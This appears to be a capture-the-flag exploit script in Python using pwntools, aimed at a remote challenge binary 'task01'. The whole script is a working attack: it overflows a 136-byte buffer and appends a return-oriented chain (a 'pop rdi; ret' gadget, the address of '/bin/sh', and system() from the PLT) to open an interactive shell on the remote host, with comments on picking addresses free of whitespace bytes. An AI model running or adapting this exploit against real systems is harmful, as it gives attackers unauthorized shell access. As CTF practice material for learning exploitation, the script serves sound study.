from pwn import *


# io = process("./task01")
io = remote('45.76.91.112', 10061)

io.recvuntil(b"What is your name?")


junk_length = 128 + 8
msg = "Hack-in-progress\0"
junk = bytes(msg + 'a' * (junk_length - len(msg)), 'utf-8')
input = junk

# This address is not good since 0x20 == ASCII for ' ', so scanf would stop.
# rdi_value = p64(0x402072) # Address of "/bin/sh"

first_ret_value = p64(0x4012db) # Address of "pop rdi; ret" gadget
rdi_value = p64(0x403072) # Address of "/bin/sh"
second_ret_value = p64(0x401050) # Address of system() function in .plt section
input += first_ret_value + rdi_value + second_ret_value


io.sendline(input)

io.interactive()
